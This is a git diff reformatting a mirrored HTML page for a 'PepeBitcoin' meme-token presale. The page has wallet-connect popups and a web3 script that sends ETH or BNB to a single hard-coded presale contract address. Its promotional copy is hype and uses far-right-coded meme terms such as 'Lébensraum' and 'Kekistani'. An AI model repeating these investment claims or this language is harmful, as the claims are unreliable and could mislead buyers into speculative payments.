@@ -1,568 +1,584 @@
-<!DOCTYPE html><html lang="en"><!-- Mirrored from PepeBitcoin.rip/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 May 2023 14:55:44 GMT --><head>
+<!DOCTYPE html>
+<html lang="en">
+<!-- Mirrored from PepeBitcoin.rip/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 May 2023 14:55:44 GMT -->
+
+<head>
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-RBHRWCGL74"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag("js", new Date());
 
-        gtag('config', 'G-RBHRWCGL74');
+        gtag("config", "G-RBHRWCGL74");
     </script>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>PepeBitcoin</title>
-    <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
-    <link rel="stylesheet" href="css/bootstrap.min.css">
-    <link rel="stylesheet" href="css/all.min.css">
-    <link rel="stylesheet" href="css/swiper-bundle.min.css">
-    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/all.min.css" />
+    <link rel="stylesheet" href="css/swiper-bundle.min.css" />
+    <link rel="stylesheet" href="css/style.css" />
     <script src="js/jquery-3.6.0.min.js"></script>
     <script src="js/web3.min.js"></script>
     <script src="js/index.min.js"></script>
-<style>
-    /* @media screen and (max-width: 768px) {
-      .hide-on-mobile {
-        top: calc(800px + 80%) !important;
-      }
-    } */
+    <style>
+        /* @media screen and (max-width: 768px) {
+            .hide-on-mobile {
+              top: calc(800px + 80%) !important;
+            }
+          } */
 
-    /* Input boxes design */
-    .swap-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        /* transform: translateY(-70px); */
-        /* Adjust the margin as needed */
-        width: 130%;
-    }
+        /* Input boxes design */
+        .swap-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            /* transform: translateY(-70px); */
+            /* Adjust the margin as needed */
+            width: 130%;
+        }
 
-    .second-section-custom {
-        position: relative;
-        top: 50px !important;
-    }
+        .second-section-custom {
+            position: relative;
+            top: 50px !important;
+        }
 
-    .input-group {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-bottom: 10px;
-        /* Adjust the margin as needed */
-        width: 80%;
-    }
+        .input-group {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+            /* Adjust the margin as needed */
+            width: 80%;
+        }
 
-    .input-wrapper {
-        position: relative;
-        width: 100%;
-    }
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
 
-    .input-logo {
-        position: absolute;
-        right: 10px;
-        top: 50%;
-        transform: translateY(-50%);
-        width: 24px;
-        height: 24px;
-        background-size: contain;
-        background-repeat: no-repeat;
-        background-position: center;
-    }
+        .input-logo {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
 
-    .bnb-logo {
-        background-image: url('images/binance_32.png');
-    }
+        .bnb-logo {
+            background-image: url('images/binance_32.png');
+        }
 
-    .eth-logo {
-        background-image: url('fonts/ethereum-original.svg');
-    }
+        .eth-logo {
+            background-image: url('fonts/ethereum-original.svg');
+        }
 
-    .highpepe-logo {
-        background-image: url('images/A1AOGn5.png');
-    }
+        .highpepe-logo {
+            background-image: url('images/A1AOGn5.png');
+        }
 
-    .swap-input {
-        width: 100%;
-        padding: 10px;
-        border: 1px solid #a5a5a5;
-        border-radius: 15px;
-        font-size: 1.1rem;
-        outline: none;
-        transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        box-shadow: 0 0 0 rgba(109, 109, 109, 0);
-        background-color: rgba(255, 255, 255, 0.8);
-        -webkit-appearance: none;
-        -moz-appearance: textfield;
-    }
+        .swap-input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #a5a5a5;
+            border-radius: 15px;
+            font-size: 1.1rem;
+            outline: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 0 0 rgba(109, 109, 109, 0);
+            background-color: rgba(255, 255, 255, 0.8);
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
+        }
 
-    .swap-input:focus {
-        border-color: #143494;
-        box-shadow: 0 0 0 3px rgb(60, 19, 150);
-    }
+        .swap-input:focus {
+            border-color: #143494;
+            box-shadow: 0 0 0 3px rgb(60, 19, 150);
+        }
 
-    /* Remove up and down buttons for number inputs */
-    input[type="number"]::-webkit-inner-spin-button,
-    input[type="number"]::-webkit-outer-spin-button {
-        -webkit-appearance: none;
-        margin: 0;
-    }
+        /* Remove up and down buttons for number inputs */
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
 
-    .swap-button {
-        font-size: 1.2rem;
-        background-color: #3ab44b;
-        color: #fff;
-        padding: 10px 20px;
-        margin-top: 10px;
-        border: 2px solid black;
-        border-radius: 50px;
-        cursor: pointer;
-        transition: background-color 0.3s ease, transform 0.3s ease;
-    }
+        .swap-button {
+            font-size: 1.2rem;
+            background-color: #3ab44b;
+            color: #fff;
+            padding: 10px 20px;
+            margin-top: 10px;
+            border: 2px solid black;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
 
-    .swap-button:hover {
-        background-color: #c27319;
-        transform: scale(1.05);
-    }
+        .swap-button:hover {
+            background-color: #c27319;
+            transform: scale(1.05);
+        }
 
 
-    /* Presale Box */
-    .second-section {
-        position: relative;
-        z-index: 1;
-    }
+        /* Presale Box */
+        .second-section {
+            position: relative;
+            z-index: 1;
+        }
 
-    .buying-button {
-        background-color: #3ab44b;
-        color: #fff;
-        font-size: 18px;
-        font-weight: bold;
-        border: none;
-        border-radius: 50px;
-        padding: 12px 24px;
-        margin-right: 10px;
-        cursor: pointer;
-        border: 2px solid black;
-        /* Add this line */
-    }
+        .buying-button {
+            background-color: #3ab44b;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 24px;
+            margin-right: 10px;
+            cursor: pointer;
+            border: 2px solid black;
+            /* Add this line */
+        }
 
-    .usdt-button {
-        background-color: #212f7f;
-        border-radius: 50px;
-    }
+        .usdt-button {
+            background-color: #212f7f;
+            border-radius: 50px;
+        }
 
-    .buying-button:hover {
-        background-color: #c27319;
-    }
+        .buying-button:hover {
+            background-color: #c27319;
+        }
 
-    .presale-box {
-        position: absolute;
-        top: 0%;
-        left: 50%;
-        /* Add this */
-        transform: translate(-50%, -50%);
-        /* Modify this */
-        width: 600px;
-        height: 600px;
-        border-radius: 50px;
-        background: #39963d;
-        box-shadow: 0px 20px 40px rgba(0, 0, 0, 0.05);
-        border: 5px solid black;
-        display: flex;
-        flex-direction: column;
-        justify-content: flex-start;
-        /* changed from center to flex-start */
-        align-items: center;
-        z-index: 10000;
-    }
-
-    @media screen and (max-width: 768px) {
         .presale-box {
             position: absolute;
-            top: 700px;
+            top: 0%;
             left: 50%;
-            transform: translateX(-50%);
-            width: 90%;
-            max-width: 400px;
-            /* Optional, adjust according to your preference */
+            /* Add this */
+            transform: translate(-50%, -50%);
+            /* Modify this */
+            width: 600px;
+            height: 600px;
+            border-radius: 50px;
+            background: #39963d;
+            box-shadow: 0px 20px 40px rgba(0, 0, 0, 0.05);
+            border: 5px solid black;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            /* changed from center to flex-start */
+            align-items: center;
+            z-index: 10000;
+        }
+
+        @media screen and (max-width: 768px) {
+            .presale-box {
+                position: absolute;
+                top: 700px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 90%;
+                max-width: 400px;
+                /* Optional, adjust according to your preference */
+                z-index: 9999;
+            }
+        }
+
+        @media screen and (min-width: 1281px) and (max-width: 2560px) {
+            .presale-box {
+                top: calc(80% + 90px);
+            }
+        }
+
+
+        @media screen and (max-width: 1280px) {
+            .presale-box {
+                top: calc(80% + 300px);
+            }
+        }
+
+        @media screen and (min-width: 2561px) {
+            .presale-box {
+                top: calc(80% - 700px);
+            }
+        }
+
+
+        .presale-title {
+            font-size: 2rem;
+            margin-top: 30px;
+            /* increased from 20px */
+            margin-bottom: auto;
+            /* added */
+            text-align: center;
+        }
+
+        .presale-content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
             z-index: 9999;
         }
-    }
 
-    @media screen and (min-width: 1281px) and (max-width: 2560px) {
-        .presale-box {
-            top: calc(80% + 90px);
-        }
-    }
-
-
-    @media screen and (max-width: 1280px) {
-        .presale-box {
-            top: calc(80% + 300px);
-        }
-    }
-
-    @media screen and (min-width: 2561px) {
-        .presale-box {
-            top: calc(80% - 700px);
-        }
-    }
-
-
-    .presale-title {
-        font-size: 2rem;
-        margin-top: 30px;
-        /* increased from 20px */
-        margin-bottom: auto;
-        /* added */
-        text-align: center;
-    }
-
-    .presale-content {
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100%;
-        z-index: 9999;
-    }
-
-    .presale-info {
-        font-size: 1.2rem;
-        margin-bottom: 110px;
-        font-weight: 600;
-    }
-
-
-    .progress-bar {
-        width: 80%;
-        height: 20px;
-        background-color: #e5e5e5;
-        border-radius: 20px;
-        overflow: hidden;
-        position: absolute;
-        top: 55%;
-        border: 2px solid black;
-    }
-
-    .progress-bar::before {
-        content: "";
-        display: block;
-        width: 0%;
-        height: 100%;
-        background-color: #3ab44b;
-        border-radius: 20px;
-        animation: progress-bar 2s linear forwards;
-    }
-
-    @keyframes progress-bar {
-        from {
-            width: 0%;
+        .presale-info {
+            font-size: 1.2rem;
+            margin-bottom: 110px;
+            font-weight: 600;
         }
 
-        to {
-            width: 45%;
-        }
-    }
 
-    .mastershiba-price {
-        position: absolute;
-        bottom: 140px;
-        font-size: 1rem;
-        z-index: 9999;
-
-        /* add this */
-    }
-
-    .mastershiba-price2 {
-        position: absolute;
-        bottom: -5px;
-        font-size: 0.9rem;
-        z-index: 9999;
-
-        /* add this */
-    }
-
-    .connect-wallet-container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        margin-bottom: 50px;
-    }
-
-    .connect-wallet-button {
-        font-size: 2rem;
-        color: white;
-        background-color: #1d90ff;
-        padding: 1.7rem 2.5rem;
-        border: 2px solid black;
-        border-radius: 50px;
-        cursor: pointer;
-        /* Add this line */
-    }
-
-    .connect-wallet-button:hover {
-        background-color: #0d68be;
-    }
-
-
-    .disconnect-wallet-container {
-        z-index: 99999;
-    }
-
-    .disconnect-wallet-button {
-        font-size: 1rem;
-        font-weight: bold;
-        color: white;
-        background-color: #1d90ff;
-        padding: 0.85rem 1.7rem;
-        border: solid 2px black;
-        border-radius: 50px;
-        transform: translateY(-40px);
-        cursor: pointer;
-        z-index: 99999;
-        /* Add this line */
-    }
-
-    .disconnect-wallet-button:hover {
-        background-color: #0d68be;
-    }
-
-    /* Popup */
-    .popup {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 100001;
-        backdrop-filter: blur(10px);
-    }
-
-    .popup-blur {
-        backdrop-filter: blur(10px);
-        z-index: 100001;
-    }
-
-    /* Add the following CSS */
-
-    .popup-wrapper {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        width: 100%;
-        height: 100%;
-    }
-
-    /* Update the .popup-content CSS */
-
-    .popup-content {
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        /* Remove width and height properties */
-    }
-
-    .popup-title {
-        font-size: 2rem;
-        color: #ffffff;
-        margin-bottom: 1.5rem;
-    }
-
-    @media screen and (max-width: 768px) {
-        .popup-content {
+        .progress-bar {
+            width: 80%;
+            height: 20px;
+            background-color: #e5e5e5;
+            border-radius: 20px;
+            overflow: hidden;
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+            top: 55%;
+            border: 2px solid black;
         }
-    }
 
-    .wallet-selection {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-    }
+        .progress-bar::before {
+            content: "";
+            display: block;
+            width: 0%;
+            height: 100%;
+            background-color: #3ab44b;
+            border-radius: 20px;
+            animation: progress-bar 2s linear forwards;
+        }
 
-    .wallet-selection button {
-        font-size: 1.5rem;
-        color: #ffffff;
-        background-color: #3ab44b;
-        padding: 1rem 2rem;
-        border: none;
-        border-radius: 10px;
-        margin-bottom: 1.5rem;
-        transition: background-color 0.3s ease;
-        border: 2px solid black;
-    }
+        @keyframes progress-bar {
+            from {
+                width: 0%;
+            }
 
-    .wallet-selection button:hover {
-        background-color: #0d68be;
-        cursor: pointer;
-    }
+            to {
+                width: 45%;
+            }
+        }
 
-    .network-selection {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-    }
+        .mastershiba-price {
+            position: absolute;
+            bottom: 140px;
+            font-size: 1rem;
+            z-index: 9999;
 
-    .network-selection button {
-        font-size: 1.5rem;
-        color: #ffffff;
-        background-color: #3ab44b;
-        border: 2px solid black;
-        padding: 1rem 2rem;
-        border-radius: 10px;
-        margin-bottom: 1.5rem;
-        transition: background-color 0.3s ease;
-    }
+            /* add this */
+        }
 
-    .network-selection button:hover {
-        background-color: #0d68be;
-        cursor: pointer;
-    }
+        .mastershiba-price2 {
+            position: absolute;
+            bottom: -5px;
+            font-size: 0.9rem;
+            z-index: 9999;
+
+            /* add this */
+        }
+
+        .connect-wallet-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 50px;
+        }
+
+        .connect-wallet-button {
+            font-size: 2rem;
+            color: white;
+            background-color: #1d90ff;
+            padding: 1.7rem 2.5rem;
+            border: 2px solid black;
+            border-radius: 50px;
+            cursor: pointer;
+            /* Add this line */
+        }
+
+        .connect-wallet-button:hover {
+            background-color: #0d68be;
+        }
+
+
+        .disconnect-wallet-container {
+            z-index: 99999;
+        }
+
+        .disconnect-wallet-button {
+            font-size: 1rem;
+            font-weight: bold;
+            color: white;
+            background-color: #1d90ff;
+            padding: 0.85rem 1.7rem;
+            border: solid 2px black;
+            border-radius: 50px;
+            transform: translateY(-40px);
+            cursor: pointer;
+            z-index: 99999;
+            /* Add this line */
+        }
+
+        .disconnect-wallet-button:hover {
+            background-color: #0d68be;
+        }
+
+        /* Popup */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 100001;
+            backdrop-filter: blur(10px);
+        }
+
+        .popup-blur {
+            backdrop-filter: blur(10px);
+            z-index: 100001;
+        }
+
+        /* Add the following CSS */
+
+        .popup-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Update the .popup-content CSS */
+
+        .popup-content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            /* Remove width and height properties */
+        }
+
+        .popup-title {
+            font-size: 2rem;
+            color: #ffffff;
+            margin-bottom: 1.5rem;
+        }
+
+        @media screen and (max-width: 768px) {
+            .popup-content {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+        }
+
+        .wallet-selection {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wallet-selection button {
+            font-size: 1.5rem;
+            color: #ffffff;
+            background-color: #3ab44b;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            transition: background-color 0.3s ease;
+            border: 2px solid black;
+        }
+
+        .wallet-selection button:hover {
+            background-color: #0d68be;
+            cursor: pointer;
+        }
+
+        .network-selection {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .network-selection button {
+            font-size: 1.5rem;
+            color: #ffffff;
+            background-color: #3ab44b;
+            border: 2px solid black;
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .network-selection button:hover {
+            background-color: #0d68be;
+            cursor: pointer;
+        }
 
 
 
-    .pre .presale-content {
-        margin-top: 1rem;
-    }
+        .pre .presale-content {
+            margin-top: 1rem;
+        }
 
-    .presale-info {
-        font-size: 1.2rem;
-    }
+        .presale-info {
+            font-size: 1.2rem;
+        }
 
-    .progress-bar {
-        height: 25px;
-        margin-bottom: 0.5rem;
-    }
+        .progress-bar {
+            height: 25px;
+            margin-bottom: 0.5rem;
+        }
 
-    .connect-wallet-button {
-        font-size: 1.2rem;
-        font-weight: bold;
-        padding: 0.8rem 2rem;
-    }
+        .connect-wallet-button {
+            font-size: 1.2rem;
+            font-weight: bold;
+            padding: 0.8rem 2rem;
+        }
 
-    .buying-button {
-        font-size: 1.2rem;
-        padding: 0.8rem 2rem;
-    }
+        .buying-button {
+            font-size: 1.2rem;
+            padding: 0.8rem 2rem;
+        }
 
-    .usdt-button {
-        margin-right: 0.5rem;
-    }
+        .usdt-button {
+            margin-right: 0.5rem;
+        }
 
-    .buying-button:hover {
-        background-color: #c27319;
-    }
+        .buying-button:hover {
+            background-color: #c27319;
+        }
 
-    .connect-wallet-container {
-        flex-direction: column;
-        align-items: center;
-    }
+        .connect-wallet-container {
+            flex-direction: column;
+            align-items: center;
+        }
 
-    .wallet-selection button,
-    .network-selection button {
-        font-size: 1.2rem;
-        padding: 0.8rem 1.5rem;
-        margin-bottom: 1rem;
-    }
-    }
+        .wallet-selection button,
+        .network-selection button {
+            font-size: 1.2rem;
+            padding: 0.8rem 1.5rem;
+            margin-bottom: 1rem;
+        }
+        }
 
-    .back-button {
-        background-color: #dc3545;
-    }
+        .back-button {
+            background-color: #dc3545;
+        }
 
-    .back-button:hover {
-        background-color: #c82333;
-    }
+        .back-button:hover {
+            background-color: #c82333;
+        }
 
-    .hidden {
-        display: none;
-    }
+        .hidden {
+            display: none;
+        }
 
-    .countdown-container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        transform: translateY(35px);
-    }
+        .countdown-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transform: translateY(35px);
+        }
 
-    .countdown-item {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        margin: 0 10px;
-    }
+        .countdown-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0 10px;
+        }
 
-    .countdown-value {
-        font-size: 2rem;
-        font-weight: bold;
-        text-align: center;
-        color: #212f7f;
-    }
+        .countdown-value {
+            font-size: 2rem;
+            font-weight: bold;
+            text-align: center;
+            color: #212f7f;
+        }
 
-    .countdown-label {
-        font-size: 1rem;
-        text-align: center;
-        margin-top: 10px;
-    }
+        .countdown-label {
+            font-size: 1rem;
+            text-align: center;
+            margin-top: 10px;
+        }
 
-    .countdown-message {
-        font-size: 1rem;
-        text-align: center;
-        margin-top: 40px;
-        /* Adjust the space between the countdown and the message */
-    }
+        .countdown-message {
+            font-size: 1rem;
+            text-align: center;
+            margin-top: 40px;
+            /* Adjust the space between the countdown and the message */
+        }
 
-    @media screen and (min-width: 768px) {
-  .presale-box {
-    top: calc(1000px +40%); /* Much lower position */
-  }
-}
+        @media screen and (min-width: 768px) {
+            .presale-box {
+                top: calc(900px +30%);
+                /* Much lower position */
+            }
+        }
 
-@media screen and (min-width: 1281px) {
-  .presale-box {
-    top: calc(1200px + 40%); /* Even lower  */ 
-  }
-}
+        @media screen and (min-width: 1281px) {
+            .presale-box {
+                top: calc(1200px + 30%);
+                /* Even lower  */
+            }
+        }
 
-@media screen and (min-width: 1920px) {
-  .presale-box {
-    top: calc(1500px + 40%); /* Significantly lower */ 
-  } 
-}
-@media screen and (min-width: 768px) {
-.presale-box {
-left: 200px; /* Position 50px from left */
-}
-}
+        @media screen and (min-width: 1920px) {
+            .presale-box {
+                top: calc(1500px + 40%);
+                /* Significantly lower */
+            }
+        }
 
-@media screen and (min-width: 1281px) {
-.presale-box {
-left: 400px; /* Position 100px from left */
-}
-}
+        @media screen and (min-width: 768px) {
+            .presale-box {
+                right: auto;
+                /* Remove right positioning /
+      left: 50px; / Position 50px from left */
+            }
+        }
 
-@media screen and (min-width: 1920px) {
-.presale-box {
-left: 600px; /* Position 150px from left */
-}
-}
-</style></head>
+        @media screen and (min-width: 1281px) {
+            .presale-box {
+                left: 320px;
+                /* Position 100px from left */
+            }
+        }
 
+        @media screen and (min-width: 1920px) {
+            .presale-box {
+                left: 600px;
+                /* Position 150px from left */
+            }
+        }
+    </style>
+</head>
 
 <body>
     <header class="header">
         <div class="container">
             <nav class="navbar navbar-expand-xl">
-                <a class="navbar-brand" href="index.html"><img src="images/logo.png" alt="RektPepe"></a>
-                <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+                <a class="navbar-brand" href="index.html"><img src="images/logo.png" alt="RektPepe" /></a>
+                <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse"
+                    data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false"
+                    aria-label="Toggle navigation">
                     <span class="navbar-toggler--icon"></span>
                 </button>
                 <div class="collapse navbar-collapse justify-content-end" id="navbarNavAltMarkup">
@@ -572,6 +588,7 @@ left: 600px; /* Position 150px from left */
                         <a class="nav-link" href="#howtobuy">Buy</a>
                         <a class="nav-link" href="#tokenomics">Tokenomics</a>
                         <a class="nav-link" href="#roadmap">Roadmap</a>
+                        <a class="nav-link" href="#Mining">Mining</a>
                         <a href="https://t.me/pepebitcoin" target="_blank" class="default-btn">
                             <span>Telegram</span>
                         </a>
@@ -587,20 +604,19 @@ left: 600px; /* Position 150px from left */
                 <div class="row align-items-center">
                     <div class="col-lg-4">
                         <div class="banner__thumb" data-aos="zoom-in-up" data-aos-duration="1000">
-                            <img src="images/highpepe2.png" alt="About Image" style="float: right;">
+                            <img src="images/highpepe2.png" alt="About Image" style="float: right" />
                         </div>
                     </div>
                     <div class="col-lg-4">
                         <div class="banner__content" data-aos="zoom-in" data-aos-duration="1000">
-                            <h1>$PepeBitcoin</h1>
-                            <h5 class="mt-4">The Dawning of the Meme Crusade</h5>
-                            <p class="mt-5">    
-                                21 Million, honoring $BTC's Scarity
-                                Stake thine Pepes and spread like organic memes
-                                Initial Lébensraum: Adjusted to $BTC's Tendiepower
-                                The Cleaving: Reward Rate halved every 4 harvest moons
-                                Memetic Dominion: Priveleged status amongst trve Kekistani Citizens of the Meme Empire
-                                <br>
+                            <!-- <h1>$PepeBitcoin</h1> -->
+                            <h5 class="">The Dawning of the Meme Crusade</h5>
+                            <p class="mt-5">
+                                21 Million, honoring $BTC's Scarity Stake thine Pepes and
+                                spread like organic memes Initial Lébensraum: Adjusted to
+                                $BTC's Tendiepower The Cleaving: Reward Rate halved every 4
+                                harvest moons Memetic Dominion: Priveleged status amongst trve
+                                Kekistani Citizens of the Meme Empire
                             </p>
                         </div>
                     </div>
@@ -634,18 +650,19 @@ left: 600px; /* Position 150px from left */
                         <div class="connect-wallet-container">
                             <button class="connect-wallet-button">Connect Wallet</button>
                         </div>
-                        <p class="mastershiba-price2">Listing: 1 $PepeBitcoin = 0.00099 USD</p>
+                        <p class="mastershiba-price2">
+                            Listing: 1 $PepeBitcoin = 0.00099 USD
+                        </p>
                         <div class="disconnect-wallet-container" style="display: none">
-                            <button class="disconnect-wallet-button">
-                                Disconnect
-                            </button>
+                            <button class="disconnect-wallet-button">Disconnect</button>
                         </div>
                     </div>
 
                     <!-- Wallet Provider Popup -->
                     <div class="popup" id="wallet-provider-popup">
                         <div class="popup-overlay"></div>
-                        <div class="popup-wrapper"> <!-- Add this wrapper div -->
+                        <div class="popup-wrapper">
+                            <!-- Add this wrapper div -->
                             <div class="popup-content">
                                 <h2 class="popup-title">Connect Wallet</h2>
                                 <div class="wallet-selection">
@@ -657,7 +674,8 @@ left: 600px; /* Position 150px from left */
                                     </button>
                                 </div>
                             </div>
-                        </div> <!-- Close the wrapper div -->
+                        </div>
+                        <!-- Close the wrapper div -->
                     </div>
 
                     <!-- Network Selection Popup -->
@@ -667,7 +685,9 @@ left: 600px; /* Position 150px from left */
                             <div class="popup-content">
                                 <h2 class="popup-title">Select Network</h2>
                                 <div class="network-selection">
-                                    <button class="network-button" id="eth-button">Ethereum</button>
+                                    <button class="network-button" id="eth-button">
+                                        Ethereum
+                                    </button>
                                     <button class="network-button" id="bsc-button">
                                         Binance Smart Chain
                                     </button>
@@ -676,115 +696,116 @@ left: 600px; /* Position 150px from left */
                         </div>
                     </div>
 
-
-
-
                     <script>
                         const presaleContractABI = [
                             {
-                                "inputs": [
+                                inputs: [
                                     {
-                                        "internalType": "address",
-                                        "name": "_tokenAddress",
-                                        "type": "address"
+                                        internalType: "address",
+                                        name: "_tokenAddress",
+                                        type: "address",
                                     },
                                     {
-                                        "internalType": "address payable",
-                                        "name": "_beneficiary",
-                                        "type": "address"
+                                        internalType: "address payable",
+                                        name: "_beneficiary",
+                                        type: "address",
                                     },
                                     {
-                                        "internalType": "uint256",
-                                        "name": "_conversionRate",
-                                        "type": "uint256"
-                                    }
+                                        internalType: "uint256",
+                                        name: "_conversionRate",
+                                        type: "uint256",
+                                    },
                                 ],
-                                "stateMutability": "nonpayable",
-                                "type": "constructor"
+                                stateMutability: "nonpayable",
+                                type: "constructor",
                             },
                             {
-                                "anonymous": false,
-                                "inputs": [
+                                anonymous: false,
+                                inputs: [
                                     {
-                                        "indexed": true,
-                                        "internalType": "address",
-                                        "name": "buyer",
-                                        "type": "address"
+                                        indexed: true,
+                                        internalType: "address",
+                                        name: "buyer",
+                                        type: "address",
                                     },
                                     {
-                                        "indexed": false,
-                                        "internalType": "uint256",
-                                        "name": "amount",
-                                        "type": "uint256"
-                                    }
+                                        indexed: false,
+                                        internalType: "uint256",
+                                        name: "amount",
+                                        type: "uint256",
+                                    },
                                 ],
-                                "name": "TokensPurchased",
-                                "type": "event"
+                                name: "TokensPurchased",
+                                type: "event",
                             },
                             {
-                                "inputs": [],
-                                "name": "withdrawFunds",
-                                "outputs": [],
-                                "stateMutability": "nonpayable",
-                                "type": "function"
+                                inputs: [],
+                                name: "withdrawFunds",
+                                outputs: [],
+                                stateMutability: "nonpayable",
+                                type: "function",
                             },
                             {
-                                "stateMutability": "payable",
-                                "type": "receive"
+                                stateMutability: "payable",
+                                type: "receive",
                             },
                             {
-                                "inputs": [],
-                                "name": "beneficiary",
-                                "outputs": [
+                                inputs: [],
+                                name: "beneficiary",
+                                outputs: [
                                     {
-                                        "internalType": "address payable",
-                                        "name": "",
-                                        "type": "address"
-                                    }
+                                        internalType: "address payable",
+                                        name: "",
+                                        type: "address",
+                                    },
                                 ],
-                                "stateMutability": "view",
-                                "type": "function"
+                                stateMutability: "view",
+                                type: "function",
                             },
                             {
-                                "inputs": [],
-                                "name": "conversionRate",
-                                "outputs": [
+                                inputs: [],
+                                name: "conversionRate",
+                                outputs: [
                                     {
-                                        "internalType": "uint256",
-                                        "name": "",
-                                        "type": "uint256"
-                                    }
+                                        internalType: "uint256",
+                                        name: "",
+                                        type: "uint256",
+                                    },
                                 ],
-                                "stateMutability": "view",
-                                "type": "function"
+                                stateMutability: "view",
+                                type: "function",
                             },
                             {
-                                "inputs": [],
-                                "name": "token",
-                                "outputs": [
+                                inputs: [],
+                                name: "token",
+                                outputs: [
                                     {
-                                        "internalType": "contract HighPepe",
-                                        "name": "",
-                                        "type": "address"
-                                    }
+                                        internalType: "contract HighPepe",
+                                        name: "",
+                                        type: "address",
+                                    },
                                 ],
-                                "stateMutability": "view",
-                                "type": "function"
-                            }
+                                stateMutability: "view",
+                                type: "function",
+                            },
                         ];
-                        const bnbPresaleContractAddress = "0xA4666fa5f9e2d564f52031af2015a4455586Ac8e"; // Your BNB Presale contract address
-                        const ethPresaleContractAddress = "0xA4666fa5f9e2d564f52031af2015a4455586Ac8e";
-
+                        const bnbPresaleContractAddress =
+                            "0xA4666fa5f9e2d564f52031af2015a4455586Ac8e"; // Your BNB Presale contract address
+                        const ethPresaleContractAddress =
+                            "0xA4666fa5f9e2d564f52031af2015a4455586Ac8e";
 
               // Rest of your JavaScript code...
                     </script>
 
                     <script>
-
                         let currentWeb3Instance;
                         let provider;
 
-                        async function sendTransaction(ethAmount, network, web3Instance = null) {
+                        async function sendTransaction(
+                            ethAmount,
+                            network,
+                            web3Instance = null
+                        ) {
                             if (
                                 web3Instance === null &&
                                 typeof window.ethereum !== "undefined"
@@ -799,7 +820,10 @@ left: 600px; /* Position 150px from left */
 
                             if (accounts.length > 0) {
                                 const senderAddress = accounts[0];
-                                const weiAmount = web3Instance.utils.toWei(ethAmount.toString(), "ether");
+                                const weiAmount = web3Instance.utils.toWei(
+                                    ethAmount.toString(),
+                                    "ether"
+                                );
 
                                 // Choose the correct presale contract address based on the network
                                 const chosenPresaleContractAddress =
@@ -808,7 +832,10 @@ left: 600px; /* Position 150px from left */
